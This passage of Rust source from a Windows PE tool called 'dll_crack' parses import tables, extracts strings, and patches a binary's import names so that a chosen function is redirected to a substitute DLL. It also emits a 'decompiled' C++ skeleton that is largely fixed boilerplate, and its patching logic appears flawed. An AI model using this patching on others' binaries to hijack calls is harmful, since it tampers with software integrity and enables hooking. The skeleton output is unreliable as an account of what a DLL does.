    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((String::from_utf8_lossy(&data[o..o+8]).trim_end_matches('\0').to_string(),
            u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16), u32_le(&data, o+36)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let import_rva = u32_le(&data, dd_start + 8);
    let iat_rva = u32_le(&data, dd_start + 96);
    let iat_size = u32_le(&data, dd_start + 100);

    if import_rva == 0 { return Err("无导入表".into()); }

    fn rva_off(rva: u32, secs: &[(String,u32,u32,u32,u32,u32)]) -> usize {
        for (_, va, vs, ro, rs, _) in secs {
            if rva >= *va && rva < va + vs.max(rs) && *rs > 0 {
                return (ro + (rva - va)) as usize;
            }
        }
        rva as usize
    }

    let imp_off = rva_off(import_rva, &secs);
    let imports = parse_imports(&data, imp_off, &secs)?;

    let mut out = format!("═══ IAT 导入地址表: {} ═══\n\n", path);
    out.push_str(&format!("[·] 导入DLL: {} 个\n", imports.len()));
    let total: usize = imports.iter().map(|(_, f)| f.len()).sum();
    out.push_str(&format!("[·] 总导入函数: {} 个\n", total));

    if iat_rva > 0 && iat_size > 0 {
        out.push_str(&format!("[·] 独立IAT: RVA=0x{:08X} 大小={}B\n", iat_rva, iat_size));
    }

    out.push_str("\n─── 导入详情 ───\n");
    for (dll_name, funcs) in &imports {
        out.push_str(&format!("\n[{}] ({} 函数)\n", dll_name, funcs.len()));
        for (idx, f) in funcs.iter().enumerate() {
            out.push_str(&format!("  {:3}. {}\n", idx+1, f));
        }
    }

    out.push_str("\n─── IAT修补提示 ───\n");
    out.push_str("[*] 使用方法: dll_iat <path> <DLL名> <函数名> <新DLL> <新函数>\n");
    out.push_str("[*] 示例: dll_iat target.exe kernel32.dll CreateFileW mydll.dll MyCreateFile\n");
    out.push_str("[*] 这会将CreateFileW的IAT条目指向mydll.dll!MyCreateFile\n");

    Ok(out)
}

fn iat_patch(path: &str, patch_dll: &str, patch_func: &str, new_dll: &str, new_func: &str) -> Result<String, String> {
    // 读取文件
    let mut data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 { return Err("无效PE".into()); }

    // 备份
    let bak_path = format!("{}.iat_bak", path);
    std::fs::copy(path, &bak_path).map_err(|e| format!("备份失败: {}", e))?;

    // 解析PE
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut secs = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        secs.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let import_rva = u32_le(&data, dd_start + 8);

    fn rva_off2(rva: u32, secs: &[(u32,u32,u32,u32)]) -> usize {
        for (va, vs, ro, rs) in secs {
            if rva >= *va && rva < va + vs.max(rs) && *rs > 0 {
                return (ro + (rva - va)) as usize;
            }
        }
        rva as usize
    }

    if import_rva == 0 { std::fs::remove_file(&bak_path).ok(); return Err("无导入表".into()); }

    let imp_off = rva_off2(import_rva, &secs);
    let mut found = false;
    let mut i = 0;
    loop {
        let off = imp_off + i * 20;
        if off + 20 > data.len() { break; }
        let name_rva = u32_le(&data, off + 12);
        if name_rva == 0 { break; }
        let iat_rva = u32_le(&data, off);

        let dll_name = {
            let o = rva_off2(name_rva, &secs);
            if o < data.len() {
                let end = data[o..].iter().position(|&b| b==0).map(|j| o+j).unwrap_or(data.len());
                String::from_utf8_lossy(&data[o..end.min(data.len())]).to_string()
            } else { break; }
        };

        if dll_name.to_lowercase() == patch_dll.to_lowercase() {
            // 找到了目标DLL的导入表项
            if let Some(iat_off) = {
                let o = rva_off2(iat_rva, &secs);
                if o < data.len() { Some(o) } else { None }
            } {
                let mut j = 0;
                loop {
                    let iat_entry_off = iat_off + j * 8;
                    if iat_entry_off + 8 > data.len() { break; }
                    let name_rva_field = u32_le(&data, iat_entry_off + 4);
                    let nf = if name_rva_field == 0 { u32_le(&data, iat_entry_off) } else { name_rva_field };
                    if nf == 0 { break; }

                    let func_name = if nf & 0x80000000 != 0 {
                        format!("Ord(0x{:04X})", nf & 0x7FFF)
                    } else {
                        let no = rva_off2(nf, &secs);
                        if no + 2 < data.len() {
                            let end = data[no+2..].iter().position(|&b| b==0).map(|p| no+2+p).unwrap_or(data.len());
                            String::from_utf8_lossy(&data[no+2..end.min(data.len())]).to_string()
                        } else { break; }
                    };

                    if func_name.to_lowercase() == patch_func.to_lowercase() || patch_func == "*" {
                        // 找到目标函数!
                        // 策略: 我们无法直接在IAT中更改DLL/函数名字符串(因为IAT在加载时被填充)
                        // 但我们可以修改导入描述符中的名称RVA指向
                        // 对于静态修补: 修改thunk中的名称RVA指向新DLL/新函数

                        // 实际做法: 修改导入表名称指向
                        // 将DLL名称区域改为新DLL名
                        let new_dll_bytes = new_dll.as_bytes();
                        let dll_name_off = rva_off2(name_rva, &secs);
                        if dll_name_off + new_dll_bytes.len() + 1 <= data.len() {
                            for (k, &b) in new_dll_bytes.iter().enumerate() {
                                data[dll_name_off + k] = b;
                            }
                            data[dll_name_off + new_dll_bytes.len()] = 0;
                        }

                        // 将函数名改为新函数名
                        if nf & 0x80000000 == 0 {
                            let fn_off = rva_off2(nf, &secs) + 2; // +2跳过hint
                            let new_fn_bytes = new_func.as_bytes();
                            if fn_off + new_fn_bytes.len() + 1 <= data.len() {
                                for (k, &b) in new_fn_bytes.iter().enumerate() {
                                    data[fn_off + k] = b;
                                }
                                data[fn_off + new_fn_bytes.len()] = 0;
                            }
                        }

                        found = true;
                        break;
                    }
                    j += 1;
                }
            }
            break;
        }
        i += 1;
    }

    if !found {
        std::fs::remove_file(&bak_path).ok();
        return Err(format!("未找到 {}.{} 在导入表中", patch_dll, patch_func));
    }

    std::fs::write(path, &data).map_err(|e| format!("写入失败: {}", e))?;

    Ok(format!("IAT修补完成!\n  文件: {}\n  备份: {}\n  DLL: {} → {}\n  函数: {} → {}\n\n[!] 修补后PE签名将失效", path, bak_path, patch_dll, new_dll, patch_func, new_func))
}

// ═══════════════ 宿主C ABI 辅助函数 ═══════════════

fn push_msg(_plugin: &str, _text: &str) {
    // 安全空操作 — 不调用外部ABI
}

fn msg_tagged(_tag: &str, _text: &str) {
    // 安全空操作 — 不调用外部ABI
}

#[allow(dead_code)]
fn msg_update(_tag: &str, _text: &str) {
    // 安全空操作 — 不调用外部ABI
}

fn progress_create(_plugin: &str, _id: &str, _label: &str, _total: u64) -> String {
    // 安全空操作 — 不调用外部ABI, 返回空handle
    String::new()
}

fn progress_update(_handle: &str, _current: u64, _msg: &str) {
    // 安全空操作 — 不调用外部ABI
}

fn progress_finish(_handle: &str) {
    // 安全空操作 — 不调用外部ABI
}

// ═══════════════ 字符串提取 v3.0 ═══════════════

fn extract_strings(path: &str, min_len: usize) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取文件失败: {}", e))?;
    let mut out = format!("═══ 字符串提取: {} ═══\n[·] 最小长度: {} | 文件大小: {}KB\n\n", path, min_len, data.len()/1024);
    
    let mut current = Vec::new();
    let mut count = 0usize;
    let mut ascii_count = 0usize;
    let mut unicode_count = 0usize;
    
    // ASCII strings
    out.push_str("─── ASCII 字符串 ───\n");
    for &b in &data {
        if b.is_ascii_graphic() || b == b' ' {
            current.push(b);
        } else {
            if current.len() >= min_len {
                let s = String::from_utf8_lossy(&current);
                out.push_str(&format!("  [{}] {}\n", current.len(), s));
                ascii_count += 1;
                count += 1;
                if count >= 500 { out.push_str("\n[!] 已达500条上限,截断输出\n"); break; }
            }
            current.clear();
        }
    }
    if count < 500 && current.len() >= min_len {
        out.push_str(&format!("  [{}] {}\n", current.len(), String::from_utf8_lossy(&current)));
        ascii_count += 1;
        count += 1;
    }
    out.push_str(&format!("\n[·] ASCII: {} 条\n", ascii_count));
    
    // Unicode (wide) strings — scan for UTF-16LE
    if count < 500 {
        out.push_str("\n─── Unicode (UTF-16LE) 字符串 ───\n");
        let mut ucurrent = Vec::<u16>::new();
        for chunk in data.chunks_exact(2) {
            let w = u16::from_le_bytes([chunk[0], chunk[1]]);
            if w >= 0x20 && w < 0x7F {
                ucurrent.push(w);
            } else {
                if ucurrent.len() >= min_len {
                    let s: String = ucurrent.iter().map(|&c| char::from_u32(c as u32).unwrap_or('.')).collect();
                    out.push_str(&format!("  [{}] {}\n", ucurrent.len(), s));
                    unicode_count += 1;
                    count += 1;
                    if count >= 500 { break; }
                }
                ucurrent.clear();
            }
        }
        out.push_str(&format!("\n[·] Unicode: {} 条\n", unicode_count));
    }
    
    out.push_str(&format!("\n─── 总计: {} 条字符串 ───\n", ascii_count + unicode_count));
    Ok(out)
}

// ═══════════════ DLL反编译/源码重构 v3.0 ═══════════════

fn decomp_dll(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取文件失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D {
        return Err("无效PE文件 — 非MZ格式".into());
    }
    
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let magic = u16_le(&data, coff + 20);
    let is_x64 = magic == 0x20B;
    let arch = if is_x64 { "x64" } else { "x86" };
    
    let num_sections = u16_le(&data, coff + 2) as usize;
    let opt_hdr_size = u16_le(&data, coff + 16) as usize;
    let section_start = coff + 20 + opt_hdr_size;
    
    // Parse sections
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let sec_off = section_start + i * 40;
        let name = String::from_utf8_lossy(&data[sec_off..sec_off+8]).trim_matches('\0').to_string();
        let vsize = u32_le(&data, sec_off + 8) as usize;
        let vaddr = u32_le(&data, sec_off + 12) as usize;
        let rsize = u32_le(&data, sec_off + 16) as usize;
        let roff = u32_le(&data, sec_off + 20) as usize;
        let flags = u32_le(&data, sec_off + 36);
        sections.push((name, vaddr, vsize, roff, rsize, flags));
    }
    
    // Parse imports
    let opt_start = coff + 20;
    let dd_off = opt_start + if is_x64 { 112 } else { 96 };
    // DataDirectory[0]=Export, [1]=Import
    let import_rva = u32_le(&data, dd_off + 8) as usize;
    let import_size = u32_le(&data, dd_off + 12) as usize;
    let export_rva = u32_le(&data, dd_off + 0) as usize;
    let export_size = u32_le(&data, dd_off + 4) as usize;
    
    let mut imports: Vec<(String, Vec<(u32, String)>)> = Vec::new();
    if import_rva > 0 && import_size > 0 {
        if let Some(import_off) = rva_to_offset(&sections, import_rva) {
            let mut i = 0;
            loop {
                let off = import_off + i * 20;
                if off + 20 > data.len() { break; }
                let name_rva = u32_le(&data, off + 12) as usize;
                if name_rva == 0 { break; }
                let dll_name = match rva_to_offset(&sections, name_rva) {
                    Some(o) if o < data.len() => read_cstr(&data, o),
                    _ => { i += 1; continue; }
                };
                
                let iat_rva = u32_le(&data, off + 16) as usize;
                let mut funcs = Vec::new();
                if let Some(iat_off) = rva_to_offset(&sections, iat_rva) {
                    let mut j = 0;
                    let entry_size = if is_x64 { 8 } else { 4 };
                    loop {
                        let thunk_off = iat_off + j * entry_size;
                        if thunk_off + entry_size > data.len() { break; }
                        let ordinal_or_rva = if is_x64 { u64_le(&data, thunk_off) as usize } else { u32_le(&data, thunk_off) as usize };
                        if ordinal_or_rva == 0 { break; }
                        let ord_mask = if is_x64 { 0x8000000000000000usize } else { 0x80000000usize };
                        if ordinal_or_rva & ord_mask != 0 {
                            funcs.push(((ordinal_or_rva & 0xFFFF) as u32, format!("Ordinal#{}", ordinal_or_rva & 0xFFFF)));
                        } else {
                            if let Some(fn_off) = rva_to_offset(&sections, ordinal_or_rva) {
                                if fn_off + 2 < data.len() {
                                    funcs.push((0, read_cstr(&data, fn_off + 2)));
                                }
                            }
                        }
                        j += 1;
                        if j > 2000 { break; }
                    }
                }
                imports.push((dll_name, funcs));
                i += 1;
                if i > 100 { break; }
            }
        }
    }
    
    // Parse exports (rva/size already computed above)
    let mut exports: Vec<String> = Vec::new();
    if export_rva > 0 && export_size > 0 {
        if let Some(exp_off) = rva_to_offset(&sections, export_rva) {
            if exp_off + 40 <= data.len() {
                let names_rva = u32_le(&data, exp_off + 32) as usize;
                let num_names = u32_le(&data, exp_off + 24) as usize;
                if let Some(names_off) = rva_to_offset(&sections, names_rva) {
                    for i in 0..num_names.min(200) {
                        let fn_rva_off = names_off + i * 4;
                        if fn_rva_off + 4 > data.len() { break; }
                        let fn_rva = u32_le(&data, fn_rva_off) as usize;
                        if let Some(fn_off) = rva_to_offset(&sections, fn_rva) {
                            if fn_off < data.len() {
                                exports.push(read_cstr(&data, fn_off));
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Extract strings from .rdata
    let mut strings = Vec::new();
    if let Some(rdata) = sections.iter().find(|s| s.0 == ".rdata") {
        let start = rdata.3;
        let end = (rdata.3 + rdata.4).min(data.len());
        let mut cur = Vec::new();
        for off in start..end {
            let b = data[off];
            if b.is_ascii_graphic() || b == b' ' { cur.push(b); }
            else if cur.len() >= 4 { strings.push(String::from_utf8_lossy(&cur).to_string()); cur.clear(); }
            else { cur.clear(); }
        }
        if cur.len() >= 4 { strings.push(String::from_utf8_lossy(&cur).to_string()); }
    }
    
    // Generate C++ reconstruction
    let mut out = format!("// ═══════════════════════════════════════════════\n");
    out.push_str(&format!("//  反编译重构: {}\n", path));
    out.push_str(&format!("//  架构: {} | 类型: DLL\n", arch));
    out.push_str(&format!("//  导出: {} 个 | 导入DLL: {} 个\n", exports.len(), imports.len()));
    out.push_str("//  工具: dll_crack v3.0 — decomp\n");
    out.push_str("// ═══════════════════════════════════════════════\n\n");
    
    out.push_str("#include <windows.h>\n");
    
    // Include headers for imported DLLs
    let header_map: HashMap<&str, &str> = [
        ("USER32", "#include <winuser.h>"), ("GDI32", "#include <wingdi.h>"),
        ("ADVAPI32", "#include <winreg.h>"), ("SHELL32", "#include <shlobj.h>"),
        ("COMCTL32", "#include <commctrl.h>"), ("COMDLG32", "#include <commdlg.h>"),
        ("OLE32", "#include <ole2.h>"), ("VERSION", "#include <winver.h>"),
        ("PSAPI", "#include <psapi.h>"), ("dbghelp", "#include <dbghelp.h>"),
        ("vrfcore", "// Application Verifier — vrfcore.dll"),
    ].iter().cloned().collect();
    
    let mut included = std::collections::HashSet::new();
    for (dll, _) in &imports {
        let upper = dll.to_uppercase();
        for (key, header) in &header_map {
            if upper.contains(key) && included.insert(*key) {
                out.push_str(&format!("{}\n", header));
            }
        }
    }
    out.push_str("#include <string>\n#include <vector>\n#include <stdexcept>\n\n");
    
    // Exported functions
    out.push_str(&format!("// ═══ 导出函数 ({} 个) ═══\n", exports.len()));
    for exp in &exports {
        out.push_str(&format!("// DLL_EXPORT ? {}@? — 签名需从PDB恢复\n", exp));
    }
    if exports.len() <= 10 {
        for exp in &exports {
            out.push_str(&format!("extern \"C\" __declspec(dllexport) void* {}(); // 返回类型需从分析确认\n", exp));
        }
    }
    
    // Import summary
    out.push_str(&format!("\n// ═══ 导入DLL ({} 个) ═══\n", imports.len()));
    for (dll, funcs) in &imports {
        out.push_str(&format!("// [{}] — {}个函数\n", dll, funcs.len()));
    }
    
    // Key logic reconstruction based on imports
    out.push_str("\n// ═══ 核心逻辑重建 ═══\n");
    out.push_str("// 基于导入表分析:\n");
    
    let has_vrf = imports.iter().any(|(d,_)| d.to_lowercase().contains("vrfcore"));
    let has_dbghelp = imports.iter().any(|(d,_)| d.to_lowercase().contains("dbghelp"));
    let has_user32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("user32"));
    let has_advapi32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("advapi32"));
    let has_shell32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("shell32"));
    let has_comdlg32 = imports.iter().any(|(d,_)| d.to_lowercase().contains("comdlg32"));
    let has_version = imports.iter().any(|(d,_)| d.to_lowercase().contains("version"));
    let has_psapi = imports.iter().any(|(d,_)| d.to_lowercase().contains("psapi"));
    
    if has_vrf { out.push_str("// [+] Application Verifier 集成 — vrfcore.dll\n"); }
    if has_dbghelp { out.push_str("// [+] 符号/调试支持 — dbghelp.dll\n"); }
    if has_user32 { out.push_str("// [+] GUI对话框 — USER32/GDI32\n"); }
    if has_advapi32 { out.push_str("// [+] 注册表操作 — ADVAPI32\n"); }
    if has_shell32 { out.push_str("// [+] Shell集成 — SHELL32\n"); }
    if has_comdlg32 { out.push_str("// [+] 文件对话框 — COMDLG32\n"); }
    if has_version { out.push_str("// [+] 版本信息 — VERSION\n"); }
    if has_psapi { out.push_str("// [+] 进程枚举 — PSAPI\n"); }
    
    // Key strings
    let relevant: Vec<&String> = strings.iter()
        .filter(|s| s.len() >= 6 && !s.contains('\r') && !s.contains('\n'))
        .take(80)
        .collect();
    if !relevant.is_empty() {
        out.push_str("\n// ═══ 关键字符串 ═══\n");
        for s in &relevant {
            out.push_str(&format!("//   \"{}\"\n", s));
        }
    }
    
    // Structural skeleton
    out.push_str("\n// ═══ 结构骨架 ═══\n");
    out.push_str("class AppVerifUI {\n");
    out.push_str("public:\n");
    out.push_str("    int StartUI(HINSTANCE hInstance);\n");
    out.push_str("    void DisplayMessageBox(const wchar_t* msg);\n");
    out.push_str("private:\n");
    if has_vrf {
        out.push_str("    void EnumerateLayers();\n");
        out.push_str("    void CreateLayer(const wchar_t* name);\n");
        out.push_str("    void ConfigureLayer(const wchar_t* name);\n");
    }
    if has_advapi32 {
        out.push_str("    void LoadSettings();\n");
        out.push_str("    void SaveSettings();\n");
    }
    if has_dbghelp {
        out.push_str("    void ResolveSymbols(const wchar_t* modulePath);\n");
    }
    if has_shell32 {
        out.push_str("    void BrowseForTarget();\n");
    }
    if has_comdlg32 {
        out.push_str("    void OpenConfigFile();\n");
        out.push_str("    void SaveConfigFile();\n");
    }
    out.push_str("};\n");
    
    out.push_str("\n// ═══ 完整逆向需使用 IDA Pro / Ghidra / x64dbg ═══\n");
    out.push_str("// 此输出为导入表+字符串级别的结构化重建\n");
    out.push_str("// 建议: 结合调试器动态分析验证函数签名\n");
    
    Ok(out)
}

fn rva_to_offset(sections: &[(String, usize, usize, usize, usize, u32)], rva: usize) -> Option<usize> {
    for (_, vaddr, vsize, roff, _, _) in sections {
        if rva >= *vaddr && rva < vaddr + vsize {
            return Some(roff + (rva - vaddr));
        }
    }
    None
}

fn read_cstr(data: &[u8], offset: usize) -> String {
    let mut end = offset;
    while end < data.len() && data[end] != 0 { end += 1; }
    String::from_utf8_lossy(&data[offset..end]).to_string()
}
